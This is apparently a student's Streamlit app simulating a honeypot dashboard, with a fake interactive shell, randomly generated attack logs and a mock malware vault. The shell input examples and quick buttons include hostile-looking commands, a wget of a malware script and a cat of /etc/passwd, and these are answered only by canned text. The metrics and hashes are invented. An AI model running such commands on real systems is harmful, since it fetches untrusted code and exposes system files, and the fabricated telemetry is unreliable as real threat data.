import streamlit as st
import pandas as pd
import numpy as np
import time
import plotly.express as px
import plotly.graph_objects as go
from datetime import datetime, timedelta
import random
import hashlib
import json

# --- PAGE CONFIGURATION ---
st.set_page_config(
page_title="CyberShield: Deception Defense System",
page_icon="🛡️",
layout="wide",
initial_sidebar_state="expanded"
)

# --- SESSION STATE INITIALIZATION ---
if "page" not in st.session_state:
st.session_state.page = "dashboard"
if "terminal_history" not in st.session_state:
st.session_state.terminal_history = [{"dir": "system", "msg": "🟢 CyberShield Core Active | Deception Layer Engaged"}]
if "attack_logs" not in st.session_state:
st.session_state.attack_logs = []
if "quarantine_files" not in st.session_state:
st.session_state.quarantine_files = []
if "notifications" not in st.session_state:
st.session_state.notifications = []
if "threat_level" not in st.session_state:
st.session_state.threat_level = "LOW"
if "total_attacks" not in st.session_state:
st.session_state.total_attacks = 4821
if "active_honeypots" not in st.session_state:
st.session_state.active_honeypots = 12

# --- BEAUTIFUL CUSTOM CSS ---
st.markdown("""
<style>
/* Global Styles */
.stApp {
background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
color: #ffffff;
}

/* Gradient Text */
.gradient-text {
background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
font-size: 48px;
font-weight: 800;
text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
}

/* Glowing Cards */
.glow-card {
background: rgba(255, 255, 255, 0.05);
backdrop-filter: blur(10px);
border: 1px solid rgba(255, 255, 255, 0.1);
border-radius: 20px;
padding: 20px;
box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
transition: all 0.3s ease;
}
.glow-card:hover {
transform: translateY(-5px);
box-shadow: 0 12px 48px 0 rgba(31, 38, 135, 0.5);
border-color: #4ecdc4;
}

/* Neon Button */
.neon-btn {
background: linear-gradient(45deg, #ff6b6b, #ee5a24);
border: none;
color: white;
padding: 12px 30px;
border-radius: 50px;
font-weight: bold;
cursor: pointer;
transition: all 0.3s ease;
text-transform: uppercase;
letter-spacing: 2px;
box-shadow: 0 0 20px rgba(255, 107, 107, 0.4);
}
.neon-btn:hover {
transform: scale(1.05);
box-shadow: 0 0 40px rgba(255, 107, 107, 0.6);
}

/* Terminal */
.terminal-box {
background: #0a0a0a;
border: 2px solid #00ff41;
border-radius: 12px;
padding: 20px;
font-family: 'Consolas', 'Courier New', monospace;
color: #00ff41;
height: 300px;
overflow-y: auto;
box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
}

/* Metric Cards */
.metric-card {
background: linear-gradient(135deg, rgba(78, 205, 196, 0.1), rgba(69, 183, 209, 0.1));
border: 1px solid rgba(78, 205, 196, 0.2);
border-radius: 16px;
padding: 20px;
text-align: center;
backdrop-filter: blur(10px);
}

.metric-value {
font-size: 36px;
font-weight: bold;
background: linear-gradient(45deg, #4ecdc4, #45b7d1);
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
}

/* Sidebar */
.css-1d391kg {
background: rgba(15, 12, 41, 0.9);
backdrop-filter: blur(20px);
border-right: 1px solid rgba(255, 255, 255, 0.1);
}

/* Success Box */
.success-box {
background: rgba(46, 204, 113, 0.15);
border-left: 4px solid #2ecc71;
padding: 15px;
border-radius: 8px;
margin: 10px 0;
}

/* Warning Box */
.warning-box {
background: rgba(241, 196, 15, 0.15);
border-left: 4px solid #f1c40f;
padding: 15px;
border-radius: 8px;
margin: 10px 0;
}

/* Danger Box */
.danger-box {
background: rgba(231, 76, 60, 0.15);
border-left: 4px solid #e74c3c;
padding: 15px;
border-radius: 8px;
margin: 10px 0;
}

/* Animated Gradient */
@keyframes gradient {
0% { background-position: 0% 50%; }
50% { background-position: 100% 50%; }
100% { background-position: 0% 50%; }
}

.animated-gradient {
background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
background-size: 400% 400%;
animation: gradient 15s ease infinite;
padding: 20px;
border-radius: 20px;
}
</style>
""", unsafe_allow_html=True)

# --- SIDEBAR NAVIGATION ---
with st.sidebar:
st.image("https://img.icons8.com/nolan/256/cyber-security.png", width=120)
st.markdown("<h2 style='text-align: center; color: #4ecdc4;'>🛡️ CyberShield</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #95a5a6;'>Deception Defense System v5.0</p>", unsafe_allow_html=True)
st.markdown("---")

# Navigation Buttons
nav_col1, nav_col2 = st.columns(2)
with nav_col1:
if st.button("🏠 Dashboard", use_container_width=True):
st.session_state.page = "dashboard"
st.rerun()
with nav_col2:
if st.button("💻 Shell", use_container_width=True):
st.session_state.page = "shell"
st.rerun()

nav_col3, nav_col4 = st.columns(2)
with nav_col3:
if st.button("📊 Logs", use_container_width=True):
st.session_state.page = "logs"
st.rerun()
with nav_col4:
if st.button("📦 Vault", use_container_width=True):
st.session_state.page = "vault"
st.rerun()

if st.button("📚 Documentation", use_container_width=True):
st.session_state.page = "docs"
st.rerun()

st.markdown("---")

# Threat Level Indicator
st.markdown("### 🔴 Threat Status")
threat_color = "🟢" if st.session_state.threat_level == "LOW" else "🟡" if st.session_state.threat_level == "MEDIUM" else "🔴"
st.markdown(f"**{threat_color} {st.session_state.threat_level}**")

# Live Stats
st.markdown("### 📊 Live Stats")
st.metric("Total Attacks", f"{st.session_state.total_attacks:,}", delta="+12 today")
st.metric("Active Honeypots", st.session_state.active_honeypots, delta="+2")

# Developer Info
st.markdown("---")
st.markdown("### 👨‍💻 Developer")
st.info("**Thandra Shishira**\nB23CN126\nCSE (Networks)\nKITSW")

# --- PAGE ROUTING ---
if st.session_state.page == "dashboard":
# --- DASHBOARD ---
st.markdown("""
<div class='animated-gradient'>
<h1 style='color: white; text-align: center; margin: 0;'>
🛡️ CyberShield Deception Defense System
</h1>
<p style='color: white; text-align: center; opacity: 0.9;'>
Real-time Threat Detection & Honeypot Analysis Platform
</p>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Metrics Row
col1, col2, col3, col4 = st.columns(4)

with col1:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>🛡️</div>
<div class='metric-value'>1,284</div>
<div style='color: #95a5a6;'>Threats Blocked</div>
<div style='color: #2ecc71;'>↑ 12% this week</div>
</div>
""", unsafe_allow_html=True)

with col2:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>🎯</div>
<div class='metric-value'>4,821</div>
<div style='color: #95a5a6;'>Total Attacks</div>
<div style='color: #e74c3c;'>↑ 419 today</div>
</div>
""", unsafe_allow_html=True)

with col3:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>📁</div>
<div class='metric-value'>82</div>
<div style='color: #95a5a6;'>Malware Isolated</div>
<div style='color: #f39c12;'>SHA-256 Verified</div>
</div>
""", unsafe_allow_html=True)

with col4:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>⏱️</div>
<div class='metric-value'>99.9%</div>
<div style='color: #95a5a6;'>Uptime</div>
<div style='color: #2ecc71;'>✅ All Systems Go</div>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Charts Row
col1, col2 = st.columns([2, 1])

with col1:
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>📈 Attack Vector Analysis</h3>
""", unsafe_allow_html=True)

# Generate realistic attack data
dates = pd.date_range(start='2026-07-01', end='2026-07-08', freq='D')
attack_data = pd.DataFrame({
'Date': dates,
'SSH Attacks': np.random.randint(100, 500, len(dates)),
'Telnet Probes': np.random.randint(50, 300, len(dates)),
'Payload Drops': np.random.randint(20, 150, len(dates)),
'Port Scans': np.random.randint(200, 600, len(dates))
})

fig = px.line(attack_data, x='Date', y=['SSH Attacks', 'Telnet Probes', 'Payload Drops', 'Port Scans'],
title='Threat Activity Trends',
color_discrete_sequence=['#ff6b6b', '#4ecdc4', '#45b7d1', '#f39c12'])
fig.update_layout(
plot_bgcolor='rgba(0,0,0,0)',
paper_bgcolor='rgba(0,0,0,0)',
font_color='white',
legend=dict(orientation='h', yanchor='bottom', y=1.02, xanchor='right', x=1)
)
st.plotly_chart(fig, use_container_width=True)
st.markdown("</div>", unsafe_allow_html=True)

with col2:
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>🌍 Attack Sources</h3>
""", unsafe_allow_html=True)

sources = pd.DataFrame({
'Source': ['Botnets', 'Proxies', 'Tor Nodes', 'Port Scanners'],
'Count': [1842, 1204, 982, 793]
})

fig = px.pie(sources, values='Count', names='Source',
color_discrete_sequence=['#ff6b6b', '#4ecdc4', '#45b7d1', '#f39c12'],
hole=0.4)
fig.update_layout(
showlegend=True,
plot_bgcolor='rgba(0,0,0,0)',
paper_bgcolor='rgba(0,0,0,0)',
font_color='white',
legend=dict(orientation='v', yanchor='top', y=1, xanchor='left', x=0)
)
st.plotly_chart(fig, use_container_width=True)
st.markdown("</div>", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Recent Activity
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>🔄 Recent Activity</h3>
""", unsafe_allow_html=True)

recent_data = pd.DataFrame({
'Timestamp': [datetime.now() - timedelta(minutes=i) for i in range(5, 0, -1)],
'Event': [
'🚨 SSH Brute Force Attempt Blocked',
'🛡️ Malware Payload Quarantined',
'🔍 Port Scan Detected on Port 22',
'✅ Honeypot Logs Archived',
'📊 Threat Intelligence Updated'
],
'Source': ['185.220.101.4', '45.112.88.90', '192.168.1.104', 'System', 'System'],
'Status': ['Blocked', 'Quarantined', 'Alert', 'Success', 'Success']
})

st.dataframe(recent_data, use_container_width=True, hide_index=True)
st.markdown("</div>", unsafe_allow_html=True)

# Action Buttons
st.markdown("<br>", unsafe_allow_html=True)
col1, col2, col3, col4 = st.columns(4)

with col1:
if st.button("🔄 Refresh Dashboard", use_container_width=True):
st.success("Dashboard Refreshed!")
st.balloons()

with col2:
if st.button("📊 Generate Report", use_container_width=True):
st.success("Report Generated Successfully!")
st.snow()

with col3:
if st.button("🛡️ Deploy New Honeypot", use_container_width=True):
st.session_state.active_honeypots += 1
st.success(f"New Honeypot Deployed! Total: {st.session_state.active_honeypots}")

with col4:
if st.button("🚨 Emergency Shutdown", use_container_width=True):
st.error("⚠️ Emergency Shutdown Initiated! All systems secured.")
st.session_state.threat_level = "CRITICAL"

elif st.session_state.page == "shell":
# --- SHELL SIMULATOR ---
st.markdown("""
<div class='glow-card'>
<h1 style='color: #4ecdc4;'>💻 Deceptive Shell Simulator</h1>
<p style='color: #95a5a6;'>Interactive honeypot terminal - Type commands to test deception layer</p>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Terminal Display
terminal_html = ""
for item in st.session_state.terminal_history[-10:]:
if item['dir'] == 'system':
terminal_html += f"<div style='color: #00ff41;'>🟢 {item['msg']}</div>"
else:
terminal_html += f"<div style='color: #ff6b6b;'>🔴 {item['msg']}</div>"

st.markdown(f"""
<div class='terminal-box'>
{terminal_html}
</div>
""", unsafe_allow_html=True)

# Command Input
col1, col2 = st.columns([3, 1])
with col1:
cmd_input = st.text_input("💻 Enter Command:", placeholder="e.g., whoami, ls -la, wget http://malware.com/virus.sh")
with col2:
st.markdown("<br>", unsafe_allow_html=True)
execute_btn = st.button("⚡ Execute", use_container_width=True)

if execute_btn and cmd_input:
user_cmd = cmd_input.strip()
st.session_state.terminal_history.append({"dir": "attacker", "msg": f"root@honeypot:~# {user_cmd}"})

# Command Processing
if user_cmd == "whoami":
response = "root (deception layer active)"
elif user_cmd == "ls -la":
response = "total 24\ndrwxr-xr-x 4 root root 4096 Jul 8 ./\n-rw-r--r-- 1 root root 2048 Jul 8 honeypot_config.py\n-rw-r--r-- 1 root root 4096 Jul 8 attack_logs.txt\ndrwxr-xr-x 2 root root 4096 Jul 8 quarantine/"
elif user_cmd.startswith("wget "):
url = user_cmd.split(" ")[1] if len(user_cmd.split(" ")) > 1 else "unknown"
response = f"Connecting to {url}... connected!\n⚠️ Malware detected! File quarantined.\n🔒 SHA-256: {hashlib.sha256(url.encode()).hexdigest()[:32]}..."
st.session_state.quarantine_files.append({
"name": url.split("/")[-1] if "/" in url else "malware.bin",
"sha256": hashlib.sha256(url.encode()).hexdigest(),
"timestamp": datetime.now().strftime("%H:%M:%S")
})
elif user_cmd == "cat /etc/passwd":
response = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n(Redacted for security)"
elif user_cmd == "sudo -i":
response = "⚠️ Sudo access logged and monitored by deception layer"
elif user_cmd == "clear":
st.session_state.terminal_history = []
response = "🔄 Terminal Cleared"
else:
response = f"bash: {user_cmd}: command not found (redirected to deception layer)"

st.session_state.terminal_history.append({"dir": "system", "msg": response})
st.rerun()

# Quick Commands
st.markdown("### 🚀 Quick Commands")
cols = st.columns(5)
quick_cmds = ["whoami", "ls -la", "wget malware.sh", "cat /etc/passwd", "clear"]

for i, cmd in enumerate(quick_cmds):
with cols[i]:
if st.button(cmd, use_container_width=True):
st.session_state.terminal_history.append({"dir": "attacker", "msg": f"root@honeypot:~# {cmd}"})
if cmd == "whoami":
response = "root (deception layer active)"
elif cmd == "ls -la":
response = "total 24\ndrwxr-xr-x 4 root root 4096 Jul 8 ./\n-rw-r--r-- 1 root root 2048 Jul 8 honeypot_config.py\n-rw-r--r-- 1 root root 4096 Jul 8 attack_logs.txt\ndrwxr-xr-x 2 root root 4096 Jul 8 quarantine/"
elif cmd == "wget malware.sh":
response = "Connecting to malware.sh... connected!\n⚠️ Malware detected! File quarantined.\n🔒 SHA-256: e3b0c44298fc1c149afbf4c8996fb924..."
st.session_state.quarantine_files.append({
"name": "malware.sh",
"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
"timestamp": datetime.now().strftime("%H:%M:%S")
})
elif cmd == "cat /etc/passwd":
response = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n(Redacted for security)"
elif cmd == "clear":
st.session_state.terminal_history = []
response = "🔄 Terminal Cleared"
st.session_state.terminal_history.append({"dir": "system", "msg": response})
st.rerun()

elif st.session_state.page == "logs":
# --- FORENSIC LOGS ---
st.markdown("""
<div class='glow-card'>
<h1 style='color: #4ecdc4;'>🔍 Forensic Log Telemetry</h1>
<p style='color: #95a5a6;'>Comprehensive attack logging and analysis</p>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Filters
col1, col2, col3 = st.columns(3)
with col1:
log_filter = st.selectbox("Filter by Event Type", ["All", "SSH Attack", "Telnet Probe", "Malware Drop", "Port Scan"])
with col2:
date_filter = st.date_input("Date Range", [datetime.now() - timedelta(days=7), datetime.now()])
with col3:
if st.button("🔄 Apply Filters", use_container_width=True):
st.success("Filters Applied!")

st.markdown("<br>", unsafe_allow_html=True)

# Generate Log Data
log_data = []
attack_types = ["SSH Attack", "Telnet Probe", "Malware Drop", "Port Scan", "Brute Force"]
ip_sources = ["185.220.101.4", "45.112.88.90", "192.168.1.104", "10.0.0.15", "172.16.0.25", "203.0.113.1"]
users = ["root", "admin", "support", "test", "guest", "user"]

for i in range(50):
log_data.append({
"Timestamp": (datetime.now() - timedelta(minutes=random.randint(0, 1440))).strftime("%Y-%m-%d %H:%M:%S"),
"Event Type": random.choice(attack_types),
"Source IP": random.choice(ip_sources),
"Username": random.choice(users),
"Action": random.choice(["BLOCKED", "TRAPPED", "QUARANTINED", "ALERT", "MONITORED"]),
"Severity": random.choice(["LOW", "MEDIUM", "HIGH", "CRITICAL"])
})

df = pd.DataFrame(log_data).sort_values("Timestamp", ascending=False)

# Display Logs
st.dataframe(df, use_container_width=True, height=400)

# Statistics
st.markdown("<br>", unsafe_allow_html=True)
col1, col2, col3, col4 = st.columns(4)

with col1:
st.metric("Total Events", len(df))
with col2:
st.metric("Critical Events", len(df[df['Severity'] == "CRITICAL"]))
with col3:
st.metric("Unique IPs", df['Source IP'].nunique())
with col4:
st.metric("Blocked Attempts", len(df[df['Action'] == "BLOCKED"]))

# Export Button
if st.button("📥 Export Logs to CSV", use_container_width=True):
csv = df.to_csv(index=False)
st.download_button("Download CSV", csv, "attack_logs.csv", "text/csv")

elif st.session_state.page == "vault":
# --- MALWARE VAULT ---
st.markdown("""
<div class='glow-card'>
<h1 style='color: #4ecdc4;'>📦 Cryptographic Payload Vault</h1>
<p style='color: #95a5a6;'>Isolated malware repository with SHA-256 verification</p>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Vault Stats
col1, col2, col3 = st.columns(3)
with col1:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>📁</div>
<div class='metric-value'>82</div>
<div style='color: #95a5a6;'>Total Quarantined</div>
</div>
""", unsafe_allow_html=True)
with col2:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>🔒</div>
<div class='metric-value'>100%</div>
<div style='color: #95a5a6;'>Isolated Safely</div>
</div>
""", unsafe_allow_html=True)
with col3:
st.markdown("""
<div class='metric-card'>
<div style='font-size: 24px;'>🛡️</div>
<div class='metric-value'>24/7</div>
<div style='color: #95a5a6;'>Monitoring Active</div>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Quarantine Files
vault_data = [
{"File": "malware_injector.sh", "Size": "14.2 KB", "SHA-256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "Severity": "HIGH", "Detected": "2026-07-08 14:15:22"},
{"File": "worm_installer.bin", "Size": "420.5 KB", "SHA-256": "8f42a1b9c83624e1d749abf4c8996fb92427ae41e4649b934ca495991b7852b", "Severity": "CRITICAL", "Detected": "2026-07-08 13:42:10"},
{"File": "rootkit_core.py", "Size": "28.1 KB", "SHA-256": "3a11f2c9b84614e7d429abf4c8996fb92427ae41e4649b934ca495991b7852c", "Severity": "CRITICAL", "Detected": "2026-07-08 12:18:45"},
{"File": "ransomware_encryptor.exe", "Size": "1.2 MB", "SHA-256": "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730", "Severity": "CRITICAL", "Detected": "2026-07-08 11:05:33"},
{"File": "backdoor_shell.php", "Size": "4.8 KB", "SHA-256": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8", "Severity": "HIGH", "Detected": "2026-07-08 09:30:12"}
]

df_vault = pd.DataFrame(vault_data)
st.dataframe(df_vault, use_container_width=True, hide_index=True)

# Add Malware Sample
st.markdown("<br>", unsafe_allow_html=True)
st.markdown("### 📤 Upload New Malware Sample")
col1, col2 = st.columns([2, 1])
with col1:
sample_name = st.text_input("File Name:", placeholder="malware_sample.exe")
sample_hash = st.text_input("SHA-256 Hash:", placeholder="Enter SHA-256 hash")
with col2:
st.markdown("<br>", unsafe_allow_html=True)
if st.button("🔒 Quarantine File", use_container_width=True):
if sample_name and sample_hash:
st.success(f"✅ File '{sample_name}' quarantined successfully!")
st.balloons()
else:
st.error("⚠️ Please enter both file name and hash")

# Analysis Tools
st.markdown("<br>", unsafe_allow_html=True)
st.markdown("### 🔬 Analysis Tools")
col1, col2, col3 = st.columns(3)

with col1:
if st.button("🧪 Run Malware Analysis", use_container_width=True):
st.info("🔬 Running dynamic analysis on quarantined files...")
time.sleep(1)
st.success("✅ Analysis complete! No active threats detected.")

with col2:
if st.button("📊 Generate Report", use_container_width=True):
st.info("📊 Generating comprehensive vault report...")
time.sleep(1)
st.success("✅ Report generated and saved to vault_report.pdf")

with col3:
if st.button("🗑️ Clean Vault", use_container_width=True):
st.warning("⚠️ This will delete all quarantined files!")
if st.button("Confirm Clean", use_container_width=True):
st.success("✅ Vault cleaned successfully!")

elif st.session_state.page == "docs":
# --- DOCUMENTATION ---
st.markdown("""
<div class='glow-card'>
<h1 style='color: #4ecdc4;'>📚 Academic Documentation</h1>
<p style='color: #95a5a6;'>Project Overview & Technical Details</p>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Project Info
col1, col2 = st.columns([2, 1])

with col1:
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>🎯 Project Overview</h3>
<p style='color: #ecf0f1;'>
<strong>CyberShield</strong> is an advanced deception-based cyber attack detection and analysis system
utilizing honeypot technology to trap, monitor, and analyze malicious actors in real-time.
</p>
<br>
<h4 style='color: #45b7d1;'>📌 Key Features</h4>
<ul style='color: #ecf0f1;'>
<li>🛡️ Real-time threat detection and blocking</li>
<li>💻 Interactive deceptive shell environment</li>
<li>🔍 Comprehensive forensic logging</li>
<li>📦 Malware quarantine and analysis</li>
<li>📊 Visual threat intelligence dashboard</li>
<li>🔐 SHA-256 cryptographic verification</li>
</ul>
</div>
""", unsafe_allow_html=True)

with col2:
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>👨‍💻 Developer</h3>
<div style='color: #ecf0f1;'>
<p><strong>Name:</strong> Thandra Shishira</p>
<p><strong>ID:</strong> B23CN126</p>
<p><strong>Department:</strong> CSE (Networks)</p>
<p><strong>College:</strong> KITSW Core Lab</p>
<p><strong>Version:</strong> 5.0</p>
<p><strong>Status:</strong> 🟢 Active</p>
</div>
</div>
""", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Technical Architecture
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>🏗️ Technical Architecture</h3>
""", unsafe_allow_html=True)

arch_data = pd.DataFrame({
'Component': ['Deception Layer', 'Honeypot Engine', 'Log Analyzer', 'Vault Manager', 'Dashboard'],
'Status': ['🟢 Active', '🟢 Active', '🟢 Active', '🟢 Active', '🟢 Active'],
'Version': ['2.1', '3.0', '1.5', '2.0', '4.2'],
'Security': ['HIGH', 'CRITICAL', 'MEDIUM', 'HIGH', 'MEDIUM']
})
st.dataframe(arch_data, use_container_width=True, hide_index=True)
st.markdown("</div>", unsafe_allow_html=True)

st.markdown("<br>", unsafe_allow_html=True)

# Deployment Guide
st.markdown("""
<div class='glow-card'>
<h3 style='color: #4ecdc4;'>🚀 Deployment Guide</h3>
""", unsafe_allow_html=True)

col1, col2 = st.columns(2)
with col1:
st.markdown("""
<div class='success-box'>
<h4 style='color: #2ecc71;'>✅ Requirements</h4>
<ul>
<li>Python 3.8+</li>
<li>Streamlit 1.25+</li>
<li>Plotly 5.0+</li>
<li>Pandas 1.5+</li>
<li>Ubuntu 20.04+ (Recommended)</li>
</ul>
</div>
""", unsafe_allow_html=True)

with col2:
st.markdown("""
<div class='warning-box'>
<h4 style='color: #f1c40f;'>📋 Installation</h4>
<code>pip install streamlit pandas numpy plotly</code><br><br>
<code>streamlit run app.py</code>
</div>
""", unsafe_allow_html=True)

st.markdown("</div>", unsafe_allow_html=True)

# Footer
st.markdown("<br>", unsafe_allow_html=True)
st.markdown("""
<div style='text-align: center; color: #95a5a6; padding: 20px;'>
<p>🛡️ CyberShield Deception Defense System v5.0</p>
<p>© 2026 Thandra Shishira | KITSW Core Lab</p>
<p>🔒 All rights reserved</p>
</div>
""", unsafe_allow_html=True)
